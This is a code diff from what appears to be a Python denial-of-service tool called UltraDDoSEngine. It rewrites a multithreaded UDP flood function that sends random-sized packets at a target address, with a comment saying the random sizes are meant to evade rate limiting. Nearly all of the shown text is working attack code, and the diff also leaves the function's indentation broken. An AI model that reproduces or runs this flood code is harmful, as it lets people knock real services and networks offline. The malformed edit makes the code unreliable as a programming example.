@@ -217,27 +217,27 @@ class UltraDDoSEngine:
         for t in thread_pool:
             t.join()
     
-    @staticmethod
-    async void_udp(target_ip: str, target_port: int, duration: int, threads: int, packet_size: int = 65500):
-        """Void UDP - Amplified UDP flood with random packet sizes"""
-        end_time = time.time() + duration
+ @staticmethod
+async def void_udp(target_ip: str, target_port: int, duration: int, threads: int, packet_size: int = 65500):
+    """Void UDP - Amplified UDP flood with random packet sizes"""
+    end_time = time.time() + duration
+    
+    def udp_worker():
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         
-        def udp_worker():
-            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-            
-            while time.time() < end_time:
-                try:
-                    # Random packet size to bypass rate limiting
-                    size = random.randint(512, packet_size)
-                    payload = random._urandom(size)
-                    sock.sendto(payload, (target_ip, target_port))
-                    attack_stats[f"{target_ip}:{target_port}"]["packets"] += 1
-                    attack_stats[f"{target_ip}:{target_port}"]["bytes"] += size
-                except:
-                    attack_stats[f"{target_ip}:{target_port}"]["errors"] += 1
-            
-            sock.close()
+        while time.time() < end_time:
+            try:
+                # Random packet size to bypass rate limiting
+                size = random.randint(512, packet_size)
+                payload = random._urandom(size)
+                sock.sendto(payload, (target_ip, target_port))
+                attack_stats[f"{target_ip}:{target_port}"]["packets"] += 1
+                attack_stats[f"{target_ip}:{target_port}"]["bytes"] += size
+            except:
+                attack_stats[f"{target_ip}:{target_port}"]["errors"] += 1
+        
+        sock.close()
         
         thread_pool = [threading.Thread(target=udp_worker) for _ in range(min(threads, MAX_THREADS))]
         for t in thread_pool:
